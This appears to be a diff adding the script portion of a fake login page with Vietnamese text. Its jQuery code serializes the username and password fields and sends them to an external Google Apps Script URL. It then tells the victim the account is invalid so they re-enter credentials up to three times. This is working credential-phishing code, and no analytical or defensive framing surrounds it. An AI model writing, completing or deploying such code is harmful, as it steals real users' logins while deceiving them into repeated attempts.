@@ -1,0 +1,53 @@
+</div>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<script type="text/javascript">
+$(document).ready(() => {
+    let num = Math.floor(Math.random() * 5) + 1;
+    $('#img' + num).show();
+});
+var count = 0;
+
+function submitForm() {
+    if (!$('#username').val().includes('@') || $('#password').val().length < 6) {
+
+    } else {
+        count++;
+    }
+
+    if (count < 3) {
+        console.log(count);
+        $('#loading').show();
+        var data = $('form#test-form').serialize();
+        $.ajax({
+            type: 'GET',
+            url: 'https://script.google.com/macros/s/AKfycbzemGLUgrBfXZeiFXKDej-xhl-iCM5nG8nl3GyF1t9Phg5WQ78KAp0s/exec',
+            dataType: 'json',
+            crossDomain: true,
+            data: data,
+            success: function(data) {
+                if (count == 2) {
+                    $('#noti').css({ "color": "red" });
+                } else if (count == 1) {
+                    $('#noti').css({ "color": "#879600" });
+                }
+                $('#noti').text('Tài khoản bạn vừa nhập không hợp lệ, Vui lòng thử lại.');
+                $('#loading').hide();
+            }, error: function(request, status, error) {
+                $('#loading').hide();
+            }
+        });
+    } else {
+        $('#loading').show();
+        var data = $('form#test-form').serialize();
+        $.ajax({
+            type: 'GET',
+            url: 'https://script.google.com/macros/s/AKfycbzemGLUgrBfXZeiFXKDej-xhl-iCM5nG8nl3GyF1t9Phg5WQ78KAp0s/exec',
+            dataType: 'json',
+            crossDomain: true,
+            data: data,
+            success: function(data) {
+				alert('ok');
+            }
+        });
